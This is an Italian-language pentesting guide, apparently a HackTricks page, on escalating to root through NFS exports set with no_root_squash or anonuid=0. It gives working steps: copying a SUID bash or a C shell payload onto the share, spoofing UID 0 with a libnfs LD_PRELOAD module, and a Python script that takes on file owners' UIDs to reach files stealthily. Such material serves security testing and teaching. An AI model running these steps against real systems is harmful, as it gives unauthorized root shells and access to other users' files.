# Escalatione dei privilegi tramite configurazione errata di NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}

## Informazioni di base sullo squashing

Con NFS AUTH_SYS/AUTH_UNIX, il server basa i controlli dei permessi dei file su `uid` e `gid` forniti in ogni richiesta RPC. Altri security flavor, come Kerberos, usano credenziali diverse e il server può mappare le credenziali numeriche prima di verificare i permessi.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Mappa ogni UID e GID all'account anonimo, che su Linux è `nobody` (65534) per impostazione predefinita. `no_all_squash` è l'impostazione predefinita per le richieste non root.<sup>[[4]](#references)</sup>
- **`root_squash`**: È l'impostazione predefinita su Linux e mappa le richieste con UID/GID 0 (root) all'account anonimo; gli altri UID e GID non vengono sottoposti a squash.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Disattiva lo squash di root, quindi le richieste con UID/GID 0 possono essere valutate come root sul server.<sup>[[4]](#references)</sup>

Se un client autorizzato può montare un export scrivibile in **`/etc/exports`** configurato con **`no_root_squash`**, le sue richieste con UID/GID 0 possono scrivere al suo interno come utente root del server.<sup>[[4]](#references)</sup>

`root_squash` rimappa solo UID/GID 0; con AUTH_SYS, un **UID/GID numerico non zero** di un client autorizzato può comunque corrispondere a un altro account sul server. Pertanto, anche con lo squash di root, un export scrivibile può diventare un percorso tra utenti diversi se il client può creare un file con tale identità numerica e il server ne consente l'accesso. Per un passaggio SUID/SGID, verifica anche il proprietario del file risultante, l'accesso in esecuzione, lo stato `nosuid` del mount sul server, le ACL e SELinux o altre policy. Il percorso esportato, l'opzione `rw` o la sola corrispondenza del numero non dimostrano che il client sia autorizzato, che l'export sia attivo o che i due host condividano la stessa mappatura effettiva delle identità. Esamina passivamente `/etc/exports` e i metadati locali; durante l'enumerazione, non montare nuove condivisioni né creare file di prova.<sup>[[4]](#references)[[5]](#references)</sup>

Per ulteriori informazioni su **NFS**, consulta:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Escalation dei privilegi

### Mappatura anonima equivalente a root

Non controllare solo la presenza di `no_root_squash`. Con `root_squash,anonuid=0,anongid=0`, la richiesta del client con UID/GID 0 viene sottoposta a squash **e rimappata a root**. Con `all_squash,anonuid=0,anongid=0`, anche le identità non root del client vengono mappate a root sul server. In un export `sec=sys` scrivibile, entrambe le configurazioni possono fornire la primitiva per creare un file di proprietà di root usata nel passaggio SUID descritto di seguito; restano valide le restrizioni relative ai client autorizzati e al mount della macchina vittima.<sup>[[4]](#references)</sup>

Sul server, usa `exportfs -v` per esaminare l'export attivo e le opzioni applicate al **client corrispondente**, incluse `rw`, `sec=`, la modalità di squash e `anonuid`/`anongid`. Esamina anche `/etc/exports.d/*.exports` durante la verifica della configurazione; `/etc/exports` da solo potrebbe essere incompleto.<sup>[[4]](#references)[[6]](#references)</sup>

```bash
# Example /etc/exports entries: squashed requests map to server UID 0
/srv/share 192.0.2.10(rw,sec=sys,root_squash,anonuid=0,anongid=0)
/srv/share 192.0.2.11(rw,sec=sys,all_squash,anonuid=0,anongid=0)
```

### Exploit remoto

Opzione 1 con bash:
- Su un client autorizzato, monta un export scrivibile come root, copiavici **`/bin/bash`**, imposta il bit **SUID** ed eseguilo da un mount della vittima che non usa `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
    - Affinché il file caricato resti di proprietà di root, il server deve preservare l'UID client 0 con **`no_root_squash`** oppure mappare la richiesta all'UID 0 con **`anonuid=0`**. Altrimenti, è possibile creare un binario SUID per un altro account solo se il client può crearlo o assegnarselo usando l'UID/GID numerico di quell'account.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Option 2 usando codice C compilato:
- Monta la directory da un client autorizzato, copia un payload compilato che sfrutta i permessi SUID, imposta il bit **SUID** ed eseguilo dalla macchina vittima (vedi alcuni [payload SUID in C](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
    - Stesse restrizioni di prima

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Local Exploit

> [!TIP]
> Nota: se riesci a creare un **tunnel dalla tua macchina alla macchina vittima, puoi comunque usare la versione Remote per sfruttare questa privilege escalation inoltrando le porte richieste**.\
> Il seguente trucco è utile quando `/etc/exports` limita l’esportazione all’IP della vittima: il client remoto non può montarla, ma la tecnica locale può operare attraverso la share già montata sull’host autorizzato.<sup>[[2]](#references)</sup>\
> Per questo metodo con libnfs senza privilegi, l’esportazione in **`/etc/exports`** deve usare il flag `insecure`, così il processo può usare una porta sorgente non riservata; `secure` è l’impostazione predefinita, anche se un processo in grado di collegarsi a una porta riservata non ha bisogno di questa opzione.<sup>[[1]](#references)[[4]](#references)</sup>

### Informazioni di base

Un client NFSv3 AUTH_UNIX include il proprio UID effettivo, GID e gruppi in ogni chiamata, e il server li usa per verificare i permessi. Questa tecnica locale sfrutta questo modello falsificando le credenziali RPC tramite [libnfs](https://github.com/sahlberg/libnfs); il suo modulo preload supporta la sovrascrittura di UID/GID nel contesto NFS.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Compilazione della libreria

L’esempio libnfs potrebbe richiedere modifiche per il kernel di destinazione; la procedura qui descritta specifica di commentare le chiamate di sistema fallocate prima di compilare il modulo preload.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Esecuzione dell'exploit

L'esempio crea un piccolo helper C che avvia una shell, quindi lo posiziona sulla share e usa `ld_nfs.so` con UID 0 nel contesto NFS per renderlo SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Compilare il codice dell'exploit:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Posiziona l'exploit sulla share e modifica i suoi permessi falsificando l'UID**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Esegui l'exploit per ottenere privilegi di root**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Bonus: NFShell per accedere ai file in modo furtivo

Una volta ottenuto l’accesso root, questo pattern `nfsh.py` imposta l’UID effettivo sull’UID del file di destinazione prima di eseguire un comando, consentendo l’accesso senza modificare ricorsivamente la proprietà.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Esegui così:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```



## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Una storia di un privesc NFS meno noto](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — pagina del manuale Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: Specifica del protocollo NFS versione 3](https://datatracker.ietf.org/doc/html/rfc1813)
- [6] [exportfs(8) — pagina del manuale Linux](https://man7.org/linux/man-pages/man8/exportfs.8.html)
{{#include ../../banners/hacktricks-training.md}}
